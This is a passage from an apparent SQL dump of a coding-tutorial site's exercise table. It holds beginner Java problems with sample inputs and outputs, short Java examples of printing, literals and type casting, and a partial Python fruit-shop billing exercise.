2:\r\n</p><p>\r\n2017\r\n</p><p>\r\nSample Output 2:\r\n</p><p>\r\nNot Leap Year</p>','B','','prog/java/Leap.java','',23,'','',''),(1088,'Java Program to find length of a string','java-program-to-find-length-of-a-string','<p>Get a String and count the characters in the string\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nHello\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n5</p>','B','','prog/java/Len.java','',29,'','',''),(1089,'Java Program to convert lower case to upper case','java-program-to-convert-lower-case-to-upper-case','<p>Get a String and convert the lower case characters to upper case Characters\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nHello\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\nHELLO</p>','B','','prog/java/Upp.java','',29,'','',''),(1090,'Java Program to print alphabets in reverse','java-program-to-print-alphabets-in-reverse','<p>Output:\r\n</p><p>\r\nz y x w v u t s r q p o n m l k j i h g f e d c b a</p>','B','','prog/java/Lr.java','',24,'','',''),(1091,'Java Program to merge two Arrays','java-program-to-merge-two-arrays','<p>Get two arrays and merge them into single array.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\n3\r\n</p><p>5 4 2\r\n</p><p>4 </p><p>\r\n9 7 6 3\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n5 4 2 9 7 6 3</p>','B','','prog/java/Mer.java','',25,'','',''),(1092,'Java Program to Multiply two Matrices','java-program-to-multiply-two-matrices','Get two matrices and perform matrix multiplication','B','','prog/java/MM.java','',25,'','',''),(1093,'Java Program to N th Multiplication table till M','java-program-to-n-th-multiplication-table-till-m','<p>Get input n and m, print the multiplication table of n till m\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\n4 7\r\n</p><p>\r\nSample output 1:\r\n</p><p>\r\n1X4=4 </p><p>\r\n2X4=8 </p><p>\r\n3X4=12\r\n</p><p> 4X4=16 </p><p>5X4=20</p><p> 6X4=24 </p><p>7X4=28</p>','B','','prog/java/Mro.java','',24,'','',''),(1094,'Java Program to sum N Postive numbers, Skip Negative Numbers.','java-program-to-sum-n-postive-numbers-skip-negative-numbers','<p>Get input n and n integers, then compute the sum of positive integers\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\n5 </p><p>6 7 2 -8 1\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n16</p>','B','','prog/java/Neg.java','',24,'','',''),(1095,'Java Program to Find the Location of Sub String in String','java-program-to-find-the-location-of-sub-string-in-string','<p>Get a String and Substring and find where the substring is present in String.\r\n</p><p>\r\nSample Input 1:</p><p>\r\n\r\nentertainment\r\n</p><p>ain\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n6</p>','B','','prog/java/Occur.java','',29,'','',''),(1096,'Java Program to Check whethet given String is Palindrome','java-program-to-check-whethet-given-string-is-palindrome','<p>Get a String and reverse the characters of the string. And check whether reverse order and original order is same.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nmadam\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\nPalindrome</p>','B','','prog/java/Palin.java','',29,'','',''),(1097,'Java Program to Reverse the Elements of Array','java-program-to-reverse-the-elements-of-array','<p>Get array size n and n elements of array, then reverse the n elements.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\n5\r\n</p><p>5 7 9 3 1\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n1 3 9 7 5</p>','B','','prog/java/Rev.java','',25,'','raptor/5thprogramme.png',''),(1098,'Java Program to Reverse the First Half  Elements of Array','java-program-to-reverse-the-first-half-elements-of-array','<p>Get array size n and n elements of array, then reverse the first n/2 elements.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\n5\r\n</p><p>5 7 9 3 1\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n7 5 9 3 1</p>','B','','prog/java/Revf.java','',25,'','',''),(1099,'Java Program to Reverse the Second Half  Elements of Array','java-program-to-reverse-the-second-half-elements-of-array','<p>Get array size n and n elements of array, then reverse the second n/2 elements.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\n5\r\n</p><p>5 7 9 3 1\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n5 7 1 3 9</p>','B','','prog/java/Revse.java','',25,'','',''),(1100,'Java Program to Reverse the Given String','java-program-to-reverse-the-given-string','<p>Get a String and reverse the characters of the string\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nHello\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\nolleH</p>','B','','prog/java/Revs.java','',29,'','',''),(1101,'Java Program to Remove the Spaces in given String','java-program-to-remove-the-spaces-in-given-string','<p>Get a String and remove the spaces\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nHello World\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\nHelloWorld</p>','B','','prog/java/Rs.java','',29,'','',''),(1102,'Java Program to Remove the Vowels in given String','java-program-to-remove-the-vowels-in-given-string','<p style=\"line-height: 1.6;\"><span style=\"font-family: &quot;Times New Roman&quot;;\">Get a String and remove the vowels\r\n</span></p><p style=\"line-height: 1.6;\"><span style=\"font-family: &quot;Times New Roman&quot;;\">\r\nSample Input 1:\r\n</span></p><p style=\"line-height: 1.6;\"><span style=\"font-family: &quot;Times New Roman&quot;;\">\r\nHello World\r\n</span></p><p style=\"line-height: 1.6;\"><span style=\"font-family: &quot;Times New Roman&quot;;\">\r\nSample Output 1:\r\n</span></p><p style=\"line-height: 1.6;\"><span style=\"font-family: &quot;Times New Roman&quot;;\">\r\nHll Wrld</span></p>','B','','prog/java/Rv.java','',29,'','',''),(1103,'Java Program to find the Second Largest Number in the Array','java-program-to-find-the-second-largest-number-in-the-array','<p>Get array size n and n elements of array, then find the second largest element among those elements.</p><p>\r\n\r\nSample Input 1:\r\n</p><p>\r\n5\r\n</p><p>5 7 9 3 1\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n7</p>','B','','prog/java/Secl.java','',25,'','',''),(1104,'Java Program to find the Second Smallest Number in the Array','java-program-to-find-the-second-smallest-number-in-the-array','<p>Get array size n and n elements of array, then find the second largest element among those elements.\r\n</p><p>\r\nSample Input 1:</p><p>\r\n\r\n5\r\n</p><p>5 7 9 3 1\r\n</p><p>\r\nSample Output 1:</p><p>\r\n\r\n7</p>','B','','prog/java/Secs.java','',25,'','',''),(1105,'Java Program to find The Sum Of Multiple Positive Number,Stops If user Enters Negative Numbers','java-program-to-find-the-sum-of-multiple-positive-numberstops-if-user-enters-negative-numbers','<p>Get positive integers from user till user enters a negative integer. calculate sum of positive integers.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\n5 6 7 2 1 8 -9\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n29\r\n</p><p>\r\nSample Input 2:\r\n</p><p>\r\n3 23 -76\r\n</p><p>\r\nSample Output 2:</p><p>\r\n\r\n26</p>','B','','prog/java/Stop.java','',24,'','',''),(1106,'Java Program to insert space between every Characters','java-program-to-insert-space-between-every-characters','<p>Get a String and Prints it characters with Space\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nHello\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\nH e l l o</p>','B','','prog/java/Stsp.java','',29,'','',''),(1107,'Java Program to transpose the Matrix','java-program-to-transpose-the-matrix','Get a Matrix and perform transpose of Matrix','B','','prog/java/TM.java','',25,'','',''),(1108,'Java Program to Convert Uppercase to Lowercase','java-program-to-convert-uppercase-to-lowercase','<p>Get a String and convert the upper case characters to lower case Characters\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nHello\r\n</p><p>\r\nSample Output 1:</p><p>\r\n\r\nhello</p>','B','','prog/java/Low.java','',29,'','',''),(1109,'Java Program to Count the Vowels','java-program-to-count-the-vowels','<p>Get a String and count the number of vowels occurred in string.\r\n</p><p>\r\nSample Input 1:\r\n</p><p>\r\nHello\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\n2</p>','B','','prog/java/Vow.java','',29,'','',''),(1110,'Java Program to Calculate Salary for Employees','java-program-to-calculate-salary-for-employees','<p>Get employee wages and number of days worked from user and find Basic Pay, DA, HRA, PF and Net Pay. (Note HRA, DA and PF are 10%,5%and 12% of basicpay respectively.)\r\n</p><p>\r\nSample Input 1:\r\n\r\n300 30\r\n</p><p>\r\nSample Output 1:\r\n</p><p>\r\nBasic Pay:3000 </p><p>DA: 150 HRA:300 </p><p>PF:360 </p><p>Net Pay: 3090</p>','B','','prog/java/Sal.java','',22,'','raptor/employee_salary.PNG',''),(1111,'println Statement Example in Java','println-statement-example-in-java','<p>Write an Example Program to print value of different data types using println() function</p><p>Hello World</p><p>10</p><p>10.20</p><p>true</p>','B','<p>class Program</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><span style=\"white-space:pre\">	</span>{</p><p><span style=\"white-space:pre\">		</span>//variable declaration and definition</p><p><span style=\"white-space:pre\">		</span>int num = 10;</p><p><span style=\"white-space:pre\">		</span>double num_f = 12.5;</p><p><span style=\"white-space:pre\">		</span>char ch = \'D\';</p><p><span style=\"white-space:pre\">		</span>String name = \"Decode\";</p><p><span style=\"white-space:pre\">		</span>boolean b = true;</p><p><span style=\"white-space:pre\">		</span>String s = \"true\";</p><p><br></p><p><span style=\"white-space:pre\">		</span>//printing using println statement</p><p><span style=\"white-space:pre\">		</span>System.out.println(num);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_f);</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch);</p><p><span style=\"white-space:pre\">		</span>System.out.println(name);</p><p><span style=\"white-space:pre\">		</span>System.out.println(b);</p><p><span style=\"white-space:pre\">		</span>System.out.println(s);</p><p><br></p><p><span style=\"white-space:pre\">	</span></p><p><span style=\"white-space:pre\">	</span>}</p><p>}</p><div><br></div>',NULL,'<p>println function is method of class PrintStream. out is a instance of PrintStream Class and also the Data member of System class lies in java.lang package. print() method is overloaded method which prints all the datatypes. The following are the overloaded print() methods:</p><p><span style=\"white-space:pre\">	</span>println(String s)</p><p><span style=\"white-space:pre\">	</span>println(boolean b)</p><p><span style=\"white-space:pre\">	</span>println(char c)</p><p><span style=\"white-space:pre\">	</span>println(double d)</p><p><span style=\"white-space:pre\">	</span>println(float f)</p><p><span style=\"white-space:pre\">	</span>println(long l)</p><p><span style=\"white-space:pre\">	</span>println(int i)</p><p><span style=\"white-space:pre\">	</span>println(object obj)</p><div><br></div>',21,'output/println.png','',''),(1112,'Literals in Java With Example','literals-in-java-with-example','<p>Write an Example program to illustrate what are the different kinds of literals in java.<br></p>','B','<p>class Program</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><span style=\"white-space:pre\">	</span>{</p><p><span style=\"white-space:pre\">		</span>//variable declaration and definition</p><p><span style=\"white-space:pre\">		</span>int num = 10;</p><p><span style=\"white-space:pre\">		</span>double num_f = 12.5;</p><p><span style=\"white-space:pre\">		</span>char ch = \'D\';</p><p><span style=\"white-space:pre\">		</span>String name = \"Decode\";</p><p><span style=\"white-space:pre\">		</span>boolean b = true;</p><p><span style=\"white-space:pre\">		</span>String s = \"true\";</p><p><br></p><p><span style=\"white-space:pre\">		</span>//printing using println statement</p><p><span style=\"white-space:pre\">		</span>System.out.println(num);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_f);</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch);</p><p><span style=\"white-space:pre\">		</span>System.out.println(name);</p><p><span style=\"white-space:pre\">		</span>System.out.println(b);</p><p><span style=\"white-space:pre\">		</span>System.out.println(s);</p><p><br></p><p><span style=\"white-space:pre\">	</span></p><p><span style=\"white-space:pre\">	</span>}</p><p>}</p><p><br></p>',NULL,'<p>Literals are the values which specified literally (directly) in the program. It is hard-coded. it remains same.</p><p>Here 10 is integer literal, \"Decode\" is String Literal, 12.5 is Float Literal, true is literal, \"true\" is string literal. \'D\' is character literal.</p>',21,'','',''),(1113,'Print and println difference with Example','print-and-println-difference-with-example','<p>Write an Example Program to differentiate print() and println()<br></p>','B','<p>class Program</p><p>{</p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><span style=\"white-space:pre\">	</span>{</p><p><span style=\"white-space:pre\">		</span>//variable declaration and definition</p><p><span style=\"white-space:pre\">		</span>int num = 10;</p><p><span style=\"white-space:pre\">		</span>double num_f = 12.5;</p><p><span style=\"white-space:pre\">		</span>char ch = \'D\';</p><p><span style=\"white-space:pre\">		</span>String name = \"Decode\";</p><p><span style=\"white-space:pre\">		</span>boolean b = true;</p><p><span style=\"white-space:pre\">		</span>String s = \"true\";</p><p><br></p><p><span style=\"white-space:pre\">		</span>//printing using println statement</p><p><span style=\"white-space:pre\">		</span>System.out.println(num);</p><p><span style=\"white-space:pre\">		</span>System.out.println(num_f);</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch);</p><p><span style=\"white-space:pre\">		</span>System.out.println(name);</p><p><span style=\"white-space:pre\">		</span>System.out.println(b);</p><p><span style=\"white-space:pre\">		</span>System.out.println(s);</p><p><br></p><p><span style=\"white-space:pre\">		</span>//printing using print statement</p><p><span style=\"white-space:pre\">		</span>System.out.print(num);</p><p><span style=\"white-space:pre\">		</span>System.out.print(num_f);</p><p><span style=\"white-space:pre\">		</span>System.out.print(ch);</p><p><span style=\"white-space:pre\">		</span>System.out.print(name);</p><p><span style=\"white-space:pre\">		</span>System.out.print(b);</p><p><span style=\"white-space:pre\">		</span>System.out.print(s);</p><p><br></p><p><span style=\"white-space:pre\">	</span></p><p><span style=\"white-space:pre\">	</span>}</p><p>}</p><p><br></p>',NULL,'<p>print() prints the given value and makes the cursor to stay back at end of the same line.</p><p>println() prints the given value and moves the cursor to next line.</p><p>print() and println() are belongs to the same class PrintStream</p>',21,'output/print.png','',''),(1114,'Command Line Argument Example in Java','command-line-argument-example-in-java','<p>Write a program to get command line inputs in java<br></p>','B','<p>class Program</p><p>{<br></p><p><span style=\"white-space: pre;\">	</span>public static void main(String args[])<br></p><p><span style=\"white-space: pre;\">	</span>{<br></p><p><span style=\"white-space: pre;\">		</span>System.out.println(args[0]);</p><p><span style=\"white-space: pre;\">		</span>System.out.println(Integer.parseInt(args[1])&nbsp; +1);<br></p><p><span style=\"white-space: pre;\">	</span>}<br></p><p><br></p><p>}</p><div><br></div><div><br></div>',NULL,'<p>All the programs in java accepts command line input. The thing you want to know is how to use it.&nbsp;</p><p>String args[] argument collects inputs given in the command line while running program. you can give any number of&nbsp;</p><p>inputs in command line there is no restriction in size. It always read as string and can be converted to other type.</p><p><span style=\"white-space:pre\">	</span></p><p>The given inputs can access from args[0] to... args[size-1]</p><p><br></p><p>Sample</p><p>Command to Compile Java Program: javac Program.java</p><p>Command ro run Java Program: java Program</p><p>Command line argument while run command: java Program Decode 123</p>',21,'output/commandline.png','',''),(1115,'Implicit Type Conversion Example in Java','implicit-type-conversion-example-in-java','<p>Write a program to perform implicit type conversion<br></p>','B','<p>class Program</p><p>{<br></p><p><span style=\"white-space: pre;\">	</span>public static void main(String args[])<br></p><p><span style=\"white-space: pre;\">	</span>{<br></p><p><span style=\"white-space: pre;\">		</span>byte b = 10;<br></p><p><span style=\"white-space:pre\">		</span>char ch = \'C\';</p><p><span style=\"white-space:pre\">		</span>short num = 500;</p><p><span style=\"white-space:pre\">		</span>int i;</p><p><span style=\"white-space: pre;\">		</span>i = b;<br></p><p><span style=\"white-space:pre\">		</span>System.out.println(i);</p><p><span style=\"white-space:pre\">		</span>i = ch;</p><p><span style=\"white-space:pre\">		</span>System.out.println(i);</p><p><span style=\"white-space:pre\">		</span>i = num;</p><p><span style=\"white-space:pre\">		</span>System.out.println(i);</p><p><span style=\"white-space:pre\">		</span>num = b;</p><p><span style=\"white-space:pre\">		</span>System.out.println(num);</p><p><span style=\"white-space: pre;\">		</span>//Following Conversions are not possible implictly because size of i is 4 bytes, ch is 2 bytes, b is 1 byte and num is 2 bytes&nbsp;<br></p><p><span style=\"white-space:pre\">		</span>//b=i; // size of i is greater than b</p><p><span style=\"white-space:pre\">		</span>//ch =i; // size of i is greater than ch</p><p><span style=\"white-space:pre\">		</span>//b = num; // size of num is greater than b</p><p><span style=\"white-space:pre\">		</span>//num = i; // size of i is greater than num</p><p><span style=\"white-space:pre\">	</span>}</p><p>}<br></p><div><br></div>',NULL,'<p>Implicit Type casting take place when,<span style=\"white-space:pre\">	</span>the two types are compatible, the target type is larger than the source type.</p><p>The Commented lines are not possible because source types are larger than destination types.</p>',21,'output/implicit.png','',''),(1116,'Explicit Type Conversion Example in Java','explicit-type-conversion-example-in-java','<p>Write a program to perform explicit type conversion. Where implicit conversion is not possible.</p>','B','<p>class Program</p><p><br></p><p>{</p><p><br></p><p><span style=\"white-space:pre\">	</span>public static void main(String args[])</p><p><br></p><p><span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space:pre\">		</span>byte b = 10;</p><p><span style=\"white-space:pre\">		</span>char ch = \'C\';</p><p><span style=\"white-space:pre\">		</span>short num = 500;</p><p><span style=\"white-space:pre\">		</span>int i = 5000000;</p><p><br></p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>//during explicit conversion there will be loss in data&nbsp;</p><p><span style=\"white-space:pre\">		</span>//for example 5000000 cannot accommodate in byte because the size is 1 byte (256 combinations only possible).</p><p><span style=\"white-space:pre\">		</span>// in this case 5000000 will be divided by 256 and remainder will be stored in byte (so 64)</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>b=(byte)i;</p><p><span style=\"white-space:pre\">		</span>System.out.println(b);</p><p><span style=\"white-space:pre\">		</span>ch =(char)i;</p><p><span style=\"white-space:pre\">		</span>System.out.println(ch);</p><p><span style=\"white-space:pre\">		</span>b = (byte) num;</p><p><span style=\"white-space:pre\">		</span>System.out.println(b);</p><p><span style=\"white-space:pre\">		</span>num = (short)i;</p><p><span style=\"white-space:pre\">		</span>System.out.println(num);</p><p><span style=\"white-space:pre\">	</span></p><p><span style=\"white-space:pre\">	</span></p><p><br></p><p><span style=\"white-space:pre\">	</span>}</p><p><br></p><p>}</p><div><br></div>',NULL,'<p>When you are assigning a larger type value to a variable of smaller type, then you need to perform explicit type casting.</p><p></p><p>During explicit conversion there will be loss in data. for example, 5000000 cannot accommodate in byte because the size is 1 byte (256 combinations only possible). In this case 5000000 will be divided by 256 and remainder will be stored in byte (so 64 us stored in b)</p>',21,'output/explicit.png','',''),(1117,'Escape Sequences and Format Specifiers Example in java','escape-sequences-and-format-specifiers-example-in-java','<p>Write a java Program that illustrates various escape sequences and format specifiers like backspace, hex representation, Carriage return, tab space and more.</p>','B','<p>class Program</p><p>{</p><p><span style=\"white-space: pre;\">	</span>public static void main(String args[])<br></p><p><span style=\"white-space:pre\">	</span>{</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <b>&nbsp; // Escape Sequences</b><br></p><p><span style=\"white-space:pre\">		</span>// \\b back space deletes the previous character<span style=\"white-space:pre\">	</span></p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"Hello\\b World\\n\");</p><p>&nbsp;<span style=\"white-space: pre;\">		</span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"white-space: pre;\"><br></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// \\n New line moves cursor to new line before printing World</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"Hello\\nWorld\\n\");</p><p><span style=\"white-space:pre\">		</span></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"white-space:pre\"><br></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// \\t tab space leaves a tab space before World</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"Hello\\t World\\n\");&nbsp;</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>// \\r Carriage Return Moves cursor to starting position in the same line so Devil will be Over Written</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"Hello World \\rDevil\\n\");&nbsp;</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>// \\\" prints double Quotes</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"\\\"Decode School\\\"\\n\");</p><p><br></p><p><span style=\"white-space:pre\">		</span>// \\\\ Prints slash, so a\\b&nbsp;</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"a\\\\b\\n\");</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <b>&nbsp; &nbsp; &nbsp; &nbsp; // Format Specifiers</b><br></p><p><span style=\"white-space:pre\">		</span>// .2f&nbsp; &nbsp;two digit precision in floating point numbers&nbsp;</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%.2f\\n\",10/3.0);&nbsp;</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>// %x hexa representation (a for 10)</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%x\\n\",10);&nbsp;</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>// %o Octal representation (12 for 10)</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%o\\n\",10);&nbsp;</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span>// %b Boolean representation</p><p><span style=\"white-space:pre\">		</span>System.out.printf(\"%b\\n\",10);&nbsp;</p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">		</span></p><p><span style=\"white-space:pre\">	</span>}</p><p>}</p>',NULL,'<p>Escape Sequence begins with \\</p><p>Format Specifier Begins with %</p><p><br></p>',21,'output/output_fs.png','',''),(1118,'Python Billing System','python-billing-system','<p>Read this Carefully.</p><p>Write a Python Program to calculate sale bill for the selling items in a Fruit Shop.&nbsp;<br></p><p>Consider the following dictionary as a item database.<br></p><p><i style=\"color: rgb(66, 66, 66);\">items = {</i><br></p><p><i style=\"color: rgb(66, 66, 66);\"><span style=\"white-space:pre\">		</span>101:{\'item_name\':\'Apple\',\'Quantity_in_kgs\':50,\'Price_per_kg\':200},</i></p><p><i style=\"color: rgb(66, 66, 66);\"><br></i></p><p><i style=\"color: rgb(66, 66, 66);\"><span style=\"white-space:pre\">		</span>102:{\'</i><i style=\"color: rgb(66, 66, 66);\">item_name</i><i style=\"color: rgb(66, 66, 66);\">\':\'Banana\',\'Quantity_in_kgs\':30,\'Price_per_kg\':80},</i></p><p><i style=\"color: rgb(66, 66, 66);\"><span style=\"white-space:pre\">		</span>103:{\'</i><i style=\"color: rgb(66, 66, 66);\">item_name</i><i style=\"color: rgb(66, 66, 66);\">\':\'Grapes\',\'Quantity_in_kgs\':25,\'Price_per_kg\':300},</i></p><p><i style=\"color: rgb(66, 66, 66);\"><br></i></p><p><i style=\"color: rgb(66, 66, 66);\"><span style=\"white-space:pre\">		</span>104:{\'</i><i style=\"color: rgb(66, 66, 66);\">item_name</i><i style=\"color: rgb(66, 66, 66);\">\':\'Lemon\',\'Quantity_in_kgs\':20,\'Price_per_kg\':70}</i></p><p><i style=\"color: rgb(66, 66, 66);\"><span style=\"white-space:pre\">	</span>}</i></p><p><br></p><p>Initially the transaction dictionary is Null.</p><p><span style=\"color: rgb(99, 99, 99); font-style: italic;\">trans = {}</span></p><p><br></p><p>Code the following tasks to implement Billing System for a Fruit Shop.</p><p><br></p><p>1.<span style=\"white-space:pre\">	</span>Add Fruits to the System</p><p><span style=\"white-space:pre\">		</span>a.<span style=\"white-space:pre\">	</span>Check whether the fruit is exists in database</p><p><span style=\"white-space:pre\">		</span>b.<span style=\"white-space:pre\">	</span>if exists, Get id &amp; Quantity and add the quantity to existing quantity</p><p><span style=\"white-space:pre\">		</span>c. <span style=\"white-space:pre\">	</span>if not exists, Get id, name,quantity &amp; price and add to dictionary</p><p><br></p><p>2. <span style=\"white-space:pre\">	</span>Calculate Bill During Sale.</p><p><span style=\"white-space:pre\">		</span>a.<span style=\"white-space:pre\">	</span>Get id &amp; quantity and calculate bill for one or more items</p><p><span style=\"white-space:pre\">		</span>b.<span style=\"white-space:pre\">	</span>Calculate amount for each item&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; c.&nbsp; &nbsp; &nbsp;Reduce the sold quantity of corresponding item in items database.</p><p><span style=\"white-space:pre\">		</span>d.<span style=\"white-space:pre\">	</span>Add item to transaction as below</p><p><span style=\"white-space:pre\">			</span><span style=\"color: rgb(66, 66, 66); font-style: italic;\">trans = {201:{101:[2,400],104:[.5,35]}}</span></p><p><span style=\"white-space:pre\">			</span>Here in Transaction 201: 2 kg apples for $400 and half kg lemon for </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$35 were sold.</p><p><span style=\"white-space:pre\">		</span>e.<span style=\"white-space:pre\">	</span>Display items, quantity, amount and total on each item entry</p><p><span style=\"white-space:pre\">	</span></p><p>3.<span style=\"white-space:pre\">	</span>Check Stock</p><p><span style=\"white-space:pre\">		</span>a.<span style=\"white-space:pre\">	</span>Display the items and available quantity</p><p><span style=\"white-space:pre\">		</span>b.<span style=\"white-space:pre\">	</span>Highlight the items which are available less than 5 kgs.</p><div><br></div>','B','<pre>items = {<br><span style=\"white-space:pre\">		</span>101:{\'item_name\':\'Apple\',\'Quantity_in_kgs\':50,\'Price_per_kg\':200},<br><span style=\"white-space:pre\">		</span>102:{\'item_name\':\'Banana\',\'Quantity_in_kgs\':30,\'Price_per_kg\':80},<br><span style=\"white-space:pre\">		</span>103:{\'item_name\':\'Grapes\',\'Quantity_in_kgs\':25,\'Price_per_kg\':300},<br><span style=\"white-space:pre\">		</span>104:{\'item_name\':\'Lemon\',\'Quantity_in_kgs\':20,\'Price_per_kg\':70}<br><span style=\"white-space:pre\">	</span>}<br><br>trans = {}</pre><pre>#Stock Printing<br>def stock_check():<br>&nbsp; &nbsp; print(\"Item Name | Available Stock\")<br>&nbsp; &nbsp; for item_id in items:<br>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; if items[item_id][\'Quantity_in_kgs\'] &lt;= 5:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(\"----------------------------------------\")<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(\"| \",items[item_id][\'item_name\'], \" | \",items[item_id][\'Quantity_in_kgs\'],\" |\")<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(\"----------------------------------------\")<br>&nbsp; &nbsp; &nbsp; &nbsp; else:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(\"| \",items[item_id][\'item_name\'], \" | \",items[item_id][\'Quantity_in_kgs\'],\" |\")</pre><pre>#Add New Item to Database<br>def add_new_item():<br>&nbsp; &nbsp; item_ids = list(items.keys())<br>&nbsp; &nbsp; item_id = max(item_ids) + 1<br>&nbsp; &nbsp; item_name = input(\"Enter Item Name:\")<br>&nbsp; &nbsp; price = int(input(\"Enter Price Per Kilo Gram:\"))<br>&nbsp; &nbsp; quantiy = int(input(\"Enter Quantity\"))<br>&nbsp; &nbsp; item = {\'item_name\':item_name,\'Quantity_in_kgs\':quantiy,\'Price_per_kg\':price}<br>&nbsp; &nbsp; items[item_id]= item<br>&nbsp; &nbsp; print(\'Item Added\')<br>&nbsp; &nbsp; print(\'Item id | Item Name | Quantity | Price \')<br>&nbsp; &nbsp; print(item_id, \" | \", item_name, \" | \", quantiy, \" | \", price)<br></pre><pre>#Update the Quantity of Existing Item<br>def update_item(item_id):<br>&nbsp; &nbsp; quantiy = int(input(\"Enter Quantity\"))<br>&nbsp; &nbsp; items[item_id][\'Quantity_in_kgs\'] = items[item_id][\'Quantity_in_kgs\'] + quantiy<br>&nbsp; &nbsp; print(\'Item Updated\')<br>&nbsp; &nbsp; print(\'Item id | Item Name | Quantity | Price \')<br>&nbsp; &nbsp; print(item_id, \" | \", items[item_id][\'item_name\'], \" | \", items[item_id][\'Quantity_in_kgs\'], \" | \", items[item_id][\'Price_per_kg\'] )<br></pre><pre style=\"\">#Stock Entry<br>def add_item():<br>&nbsp; &nbsp; item_name = input(\"Enter the Item Name\")<br>&nbsp; &nbsp; print(\"item id | item name\")<br>&nbsp; &nbsp; print(\"-----------------\")<br>&nbsp; &nbsp; for item in items:<br>&nbsp; &nbsp; &nbsp; &nbsp; if item_name in items[item][\'item_name\']:<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(item, \" | \", items[item][\'item_name\'])<br>&nbsp; &nbsp;&nbsp;<br>&nbsp; &nbsp; item_id = int(input(\"Enter item id (if existing)/Enter 0 (if New)\"))<br>&nbsp; &nbsp; if item_id == 0:<br>&nbsp; &nbsp; &nbsp; &nbsp; add_new_item()<br>&nbsp; &nbsp; else:<br>&nbsp; &nbsp; &nbsp; &nbsp; #Check for 